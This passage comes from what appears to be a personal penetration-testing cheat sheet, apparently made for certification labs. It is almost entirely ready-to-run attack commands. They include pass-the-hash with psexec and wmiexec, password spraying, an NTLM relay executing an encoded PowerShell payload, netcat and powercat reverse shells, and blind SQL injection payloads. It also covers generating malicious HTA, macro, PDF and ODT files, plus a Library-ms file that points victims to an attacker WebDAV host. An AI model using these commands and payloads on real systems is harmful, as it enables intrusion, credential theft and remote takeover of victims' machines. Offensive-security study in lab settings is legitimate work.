</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>netexec<span class="w"> </span>rdp<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success<span class="w"> </span>--screenshot<span class="w"> </span>--screentime<span class="w"> </span>&lt;time&gt;<span class="w"> </span><span class="c1"># --nla-screenshot</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="c1"># no bruteforce for pass spraying</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>--no-bruteforce<span class="w"> </span>--continue-on-success
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="c1"># format of hashes &quot;LMHash:NTHash&quot; if LMhash isn&#39;t available then 32 0&#39;s</span>
</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="c1"># with admin right, gives SYSTEM account access due to service running under system account</span>
</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="c1"># Process: login to writable SMB share and upload the binary, Creates service to run that binary through RPC in order to get interactive shell </span>
</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:7a38310ea6f0027ee955abed1762964b<span class="w"> </span>Domain.com/Administrator@192.168.50.21<span class="w"> </span>
</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:7a38310ea6f0027ee955abed1762964b<span class="w"> </span>Administrator@192.168.50.21<span class="w">   </span><span class="c1"># Tested, it works</span>
</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="c1"># wmiexec.py leverages WMI over DCOM to execute commands, avoiding the need to create a new service on the target system.</span>
</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a><span class="c1"># Means more stealthier than psexec</span>
</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:7a38310ea6f0027ee955abed1762964b<span class="w"> </span>Administrator@192.168.50.21
</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>
</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.50.21<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>7a38310ea6f0027ee955abed1762964b
</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>netexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.50.21<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;WORKGROUP\Administrator&#39;</span><span class="w"> </span>-H<span class="w"> </span>7a38310ea6f0027ee955abed1762964b
</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a><span class="c1"># for NTLM relay attack</span>
</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="m">192</span>.168.50.212<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span>
</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>
</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a><span class="c1"># RDP using</span>
</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a>remmina<span class="w">    </span>
</span><span id="__span-20-28"><a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a>xfreerdp3<span class="w"> </span>/u:<span class="s1">&#39;CORP\Administrator&#39;</span><span class="w"> </span>/p:<span class="s1">&#39;password&#39;</span><span class="w"> </span>/v:192.168.50.246<span class="w"> </span>/dynamic-resolution<span class="w"> </span>+clipboard
</span><span id="__span-20-29"><a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a>xfreerdp3<span class="w"> </span>/u:stephanie<span class="w"> </span>/d:corp.com<span class="w"> </span>/v:192.168.50.75<span class="w">  </span>/dynamic-resolution<span class="w"> </span>+clipboard
</span><span id="__span-20-30"><a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a>xfreerdp3<span class="w"> </span>/u:<span class="s1">&#39;CORP\Administrator&#39;</span><span class="w"> </span>/pth:<span class="s1">&#39;ntlmhash&#39;</span><span class="w"> </span>/v:192.168.50.246<span class="w"> </span>/dynamic-resolution<span class="w"> </span>+clipboard
</span><span id="__span-20-31"><a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a>
</span><span id="__span-20-32"><a id="__codelineno-20-32" name="__codelineno-20-32" href="#__codelineno-20-32"></a><span class="c1"># Reverse Shell</span>
</span><span id="__span-20-33"><a id="__codelineno-20-33" name="__codelineno-20-33" href="#__codelineno-20-33"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">4444</span>
</span><span id="__span-20-34"><a id="__codelineno-20-34" name="__codelineno-20-34" href="#__codelineno-20-34"></a><span class="c1"># try well known ports like 80</span>
</span><span id="__span-20-35"><a id="__codelineno-20-35" name="__codelineno-20-35" href="#__codelineno-20-35"></a>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="c1"># in case something might be blocked</span>
</span><span id="__span-20-36"><a id="__codelineno-20-36" name="__codelineno-20-36" href="#__codelineno-20-36"></a>penelope<span class="w"> </span>port<span class="w"> </span><span class="c1"># for more stable shell but if it doesn&#39;t work then use netcat</span>
</span><span id="__span-20-37"><a id="__codelineno-20-37" name="__codelineno-20-37" href="#__codelineno-20-37"></a>socat<span class="w"> </span>-d<span class="w"> </span>-d<span class="w"> </span>TCP-LISTEN:4444<span class="w"> </span>STDOUT
</span><span id="__span-20-38"><a id="__codelineno-20-38" name="__codelineno-20-38" href="#__codelineno-20-38"></a>
</span><span id="__span-20-39"><a id="__codelineno-20-39" name="__codelineno-20-39" href="#__codelineno-20-39"></a><span class="c1"># Very stable in non-interactive environment</span>
</span><span id="__span-20-40"><a id="__codelineno-20-40" name="__codelineno-20-40" href="#__codelineno-20-40"></a>busybox<span class="w"> </span>nc<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>&lt;port&gt;<span class="w"> </span>-e<span class="w"> </span>/bin/sh
</span><span id="__span-20-41"><a id="__codelineno-20-41" name="__codelineno-20-41" href="#__codelineno-20-41"></a>
</span><span id="__span-20-42"><a id="__codelineno-20-42" name="__codelineno-20-42" href="#__codelineno-20-42"></a>
</span><span id="__span-20-43"><a id="__codelineno-20-43" name="__codelineno-20-43" href="#__codelineno-20-43"></a>ssh<span class="w"> </span>user@192.168.0.10<span class="w"> </span><span class="s2">&quot;bash --noprofile --norc&quot;</span>
</span><span id="__span-20-44"><a id="__codelineno-20-44" name="__codelineno-20-44" href="#__codelineno-20-44"></a>ssh<span class="w"> </span>-i<span class="w"> </span>root_key<span class="w"> </span>-oPubkeyAcceptedKeyTypes<span class="o">=</span>+ssh-rsa<span class="w"> </span>-oHostKeyAlgorithms<span class="o">=</span>+ssh-rsa<span class="w"> </span>root@MACHINE_IP
</span><span id="__span-20-45"><a id="__codelineno-20-45" name="__codelineno-20-45" href="#__codelineno-20-45"></a>
</span><span id="__span-20-46"><a id="__codelineno-20-46" name="__codelineno-20-46" href="#__codelineno-20-46"></a>evil-winrm<span class="w">  </span>-i<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;MySuperSecr3tPass123!&#39;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;/home/foo/ps1_scripts/&#39;</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;/home/foo/exe_files/&#39;</span>
</span><span id="__span-20-47"><a id="__codelineno-20-47" name="__codelineno-20-47" href="#__codelineno-20-47"></a>
</span><span id="__span-20-48"><a id="__codelineno-20-48" name="__codelineno-20-48" href="#__codelineno-20-48"></a>powercat<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.119.3<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>powershell
</span><span id="__span-20-49"><a id="__codelineno-20-49" name="__codelineno-20-49" href="#__codelineno-20-49"></a>runas<span class="w"> </span>/user:backupadmin<span class="w"> </span>cmd
</span><span id="__span-20-50"><a id="__codelineno-20-50" name="__codelineno-20-50" href="#__codelineno-20-50"></a>
</span><span id="__span-20-51"><a id="__codelineno-20-51" name="__codelineno-20-51" href="#__codelineno-20-51"></a>
</span><span id="__span-20-52"><a id="__codelineno-20-52" name="__codelineno-20-52" href="#__codelineno-20-52"></a>RunasCs.exe<span class="w"> </span>user1<span class="w"> </span>password1<span class="w"> </span><span class="s2">&quot;cmd /c whoami /all&quot;</span>
</span><span id="__span-20-53"><a id="__codelineno-20-53" name="__codelineno-20-53" href="#__codelineno-20-53"></a>
</span><span id="__span-20-54"><a id="__codelineno-20-54" name="__codelineno-20-54" href="#__codelineno-20-54"></a>.<span class="w"> </span>.<span class="se">\I</span>noke-RunasCS
</span><span id="__span-20-55"><a id="__codelineno-20-55" name="__codelineno-20-55" href="#__codelineno-20-55"></a>Invoke-RunasCs<span class="w"> </span>-Username<span class="w"> </span>svc_mssql<span class="w"> </span>-Password<span class="w"> </span>trustno1<span class="w"> </span>-Command<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
</span><span id="__span-20-56"><a id="__codelineno-20-56" name="__codelineno-20-56" href="#__codelineno-20-56"></a>
</span><span id="__span-20-57"><a id="__codelineno-20-57" name="__codelineno-20-57" href="#__codelineno-20-57"></a><span class="c1"># ALSO CHECK [[#Lateral Movement in AD]]</span>
</span></code></pre></div>
<h3 id="extras">Extras</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>webshells
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>villain<span class="w"> </span><span class="c1"># for shell management</span>
</span></code></pre></div>
<h2 id="attacker-from-windows">Attacker From Windows</h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c"># DNS Enumeration</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">nslookup</span> <span class="n">-type</span><span class="p">=</span><span class="n">TXT</span> <span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="c"># bruteforce subdomain</span>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="nb">Get-Content</span> <span class="n">subdomains</span><span class="p">.</span><span class="n">txt</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="nv">$sd</span><span class="p">=</span><span class="s2">&quot;$_.example.com&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="n">nslookup</span> <span class="nv">$sd</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span><span class="p">)</span> <span class="o">-match</span> <span class="s2">&quot;Name:\s+$sd&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="nb">Write-Host</span> <span class="s2">&quot;[+] $sd&quot;</span> <span class="p">}</span> <span class="p">}</span>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a><span class="c"># Port Scanning</span>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">445</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="n">1</span><span class="p">..</span><span class="n">1024</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="nb">echo </span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TcpClient</span><span class="p">).</span><span class="n">Connect</span><span class="p">(</span><span class="s2">&quot;192.168.50.151&quot;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">))</span> <span class="s2">&quot;TCP port $_ is open&quot;</span><span class="p">}</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="c"># SMB Enumeration</span>
</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="n">net</span> <span class="n">view</span> <span class="p">\\</span><span class="n">dc01</span> <span class="p">/</span><span class="n">all</span> <span class="c"># where dc01 is the hostname</span>
</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">machine_name</span> 
</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>
</span><span id="__span-22-14"><a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="c"># Tools delivery</span>
</span><span id="__span-22-15"><a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a><span class="n">dism</span> <span class="p">/</span><span class="n">online</span> <span class="p">/</span><span class="nb">Enable-Feature</span> <span class="p">/</span><span class="n">FeatureName</span><span class="p">:</span><span class="n">TelnetClient</span> <span class="c"># to install microsoft version of telnet but requires administrative privs</span>
</span><span id="__span-22-16"><a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="c"># we can transfer windows binary from our machine</span>
</span></code></pre></div>
<h2 id="web-attack">🕸 Web Attack</h2>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Exploitation</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="c1"># sometimes browser can&#39;t show some file so use curl e.g. just an example</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span>http://ip:port/../../../../../test.txt
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="c1"># Blind SQLI - Boolean Based</span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="c1"># Payload: admin&#39; AND BINARY SUBSTRING((SELECT password FROM users WHERE username = &#39;admin&#39;),FUZZ_INDEX,1) = &#39;FUZZ_CHAR&#39;;#---</span>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>ffuf<span class="w"> </span>-c<span class="w"> </span>--request-proto<span class="w"> </span>http<span class="w"> </span>-request<span class="w"> </span>login.req<span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>seq<span class="w"> </span><span class="m">32</span><span class="o">)</span>:FUZZ_INDEX<span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import string; print(&quot;\n&quot;.join([x for x in string.ascii_letters + string.digits]))&#39;</span><span class="o">)</span>:FUZZ_CHAR<span class="w"> </span>-fr<span class="w"> </span><span class="s1">&#39;Invalid password!&#39;</span><span class="w"> </span>-o<span class="w"> </span>ffuf.json
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="c1"># Blind SQLI - Time Based</span>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="c1"># Payload: admin&#39; AND IF (SUBSTRING(@@version, FUZZ_INDEX, 1) = FUZZ_CHAR, sleep(3),&#39;false&#39;);#---</span>
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>ffuf<span class="w"> </span>-c<span class="w"> </span>--request-proto<span class="w"> </span>http<span class="w"> </span>-request<span class="w"> </span>search.req<span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>seq<span class="w"> </span><span class="m">6</span><span class="o">)</span>:FUZZ_INDEX<span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import string; print(&quot;\n&quot;.join([x for x in string.digits]))&#39;</span><span class="o">)</span>:FUZZ_CHAR<span class="w"> </span>-enc<span class="w"> </span>FUZZ_CHAR:urlencode<span class="w">    </span>-o<span class="w"> </span>ffuf.json
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="nv">payload</span><span class="o">=</span><span class="s2">&quot;select%20group_concat(%20distinct%20table_name,&#39;:&#39;)%20from%20information_schema.columns&quot;</span><span class="w"> </span><span class="c1"># we can use that var in below urldecoded: &quot;select group_concat( distinct table_schema,&#39;:&#39;) from information_schema.columns&quot; </span>
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>ffuf<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.227.16/blindsqli.php?user=offsec&#39;%20and%20if(SUBSTRING((select%20database()),FUZZ_INDEX,1)=&#39;FUZZ_CHAR&#39;,sleep(3),false)%20--%20-&quot;</span><span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>seq<span class="w"> </span><span class="m">32</span><span class="o">)</span>:FUZZ_INDEX<span class="w"> </span>-w<span class="w"> </span>&lt;<span class="o">(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import string; print(&quot;\n&quot;.join([x for x in string.ascii_letters + string.digits+&quot;,:&quot;]))&#39;</span><span class="o">)</span>:FUZZ_CHAR<span class="w"> </span>-mt<span class="w"> </span><span class="s1">&#39;&gt;5000&#39;</span><span class="w"> </span>-o<span class="w"> </span>test_ffuf.json
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a><span class="c1"># sort -un and uniq can be used in case of repetitive characters</span>
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="c1"># for checking the result of this json file</span>
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>cat<span class="w"> </span>ffuf.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span><span class="s1">&#39;.results[].input | .FUZZ_INDEX+&quot; &quot;+.FUZZ_CHAR&#39;</span><span class="w"> </span>-r<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-n<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\n&#39;</span>
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="c1"># for more indepth: [Manual Exploit Blind SQLi](https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345)</span>
</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>
</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>
</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="c1"># phpinfo.php</span>
</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="c1"># Loaded environment variables to find leaked API keys</span>
</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="c1"># version of exploit finding</span>
</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a><span class="c1"># DOCUMENT_ROOT &amp; include_path for LFI</span>
</span></code></pre></div>
<h2 id="client-side-attack">🧑 Client Side Attack</h2>
<blockquote>
<p><a href="https://github.com/rodolfomarianocy/Evil-Macro/">evil_macro.py</a>
<a href="https://github.com/jonaslejon/malicious-pdf">malicious-pdf.py</a>
<a href="https://github.com/0bfxgh0st/MMG-LO">MMG-LO</a></p>
</blockquote>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># create a malicious HTA with msfvenom</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;port&gt;<span class="w"> </span>-f<span class="w"> </span>hta-psh<span class="w"> </span>-o<span class="w"> </span>file.hta
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c1"># generate a malicious macro for a reverse shell in powershell using base64 for .doc</span>
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>python<span class="w"> </span>evil_macro.py<span class="w"> </span>-l<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;port&gt;<span class="w"> </span>-o<span class="w"> </span>macro.txt
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="c1"># generate a malicious PDF file</span>
</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>python3<span class="w"> </span>malicious-pdf.py<span class="w"> </span>burp-collaborator-url
</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c1"># generate a malicious odt file</span>
</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>python<span class="w"> </span>mmg-odt.py<span class="w"> </span>windows<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>&lt;port&gt;
</span></code></pre></div>
<h3 id="microsoft-windows-library-file">Microsoft Windows Library File</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry">Library File Schema</a>
Filename: config.Library-ms
<div class="language-xml highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nt">&lt;libraryDescription</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.microsoft.com/windows/2009/library&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="nt">&lt;name&gt;</span>@windows.storage.dll,-34582<span class="nt">&lt;/name&gt;</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="nt">&lt;version&gt;</span>6<span class="nt">&lt;/version&gt;</span>
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="nt">&lt;isLibraryPinned&gt;</span>true<span class="nt">&lt;/isLibraryPinned&gt;</span>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="nt">&lt;iconReference&gt;</span>imageres.dll,-1003<span class="nt">&lt;/iconReference&gt;</span>
</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a><span class="nt">&lt;templateInfo&gt;</span>
</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a><span class="nt">&lt;folderType&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span class="nt">&lt;/folderType&gt;</span>
</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="nt">&lt;/templateInfo&gt;</span>
</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="nt">&lt;searchConnectorDescriptionList&gt;</span>
</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a><span class="nt">&lt;searchConnectorDescription&gt;</span>
</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a><span class="nt">&lt;isDefaultSaveLocation&gt;</span>true<span class="nt">&lt;/isDefaultSaveLocation&gt;</span>
</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a><span class="nt">&lt;isSupported&gt;</span>false<span class="nt">&lt;/isSupported&gt;</span>
</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a><span class="nt">&lt;simpleLocation&gt;</span>
</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a><span class="nt">&lt;url&gt;</span>http://192.168.45.237<span class="nt">&lt;/url&gt;</span><span class="w"> </span><span class="cm">&lt;!-- webdav ip --&gt;</span>
</span><span id="__span-25-16"><a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a><span class="nt">&lt;/simpleLocation&gt;</span>
</span><span id="__span-25-17"><a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a><span class="nt">&lt;/searchConnectorDescription&gt;</span>
</span><span id="__span-25-18"><a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a><span class="nt">&lt;/searchConnectorDescriptionList&gt;</span>
</span><span id="__span-25-19"><a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a><span class="nt">&lt;/libraryDescription&gt;</span>
</span></code></pre></div></p>
<p>Host a malicious windowss shortcut file in that webdav directory that will gonna give us back the reverse shell.
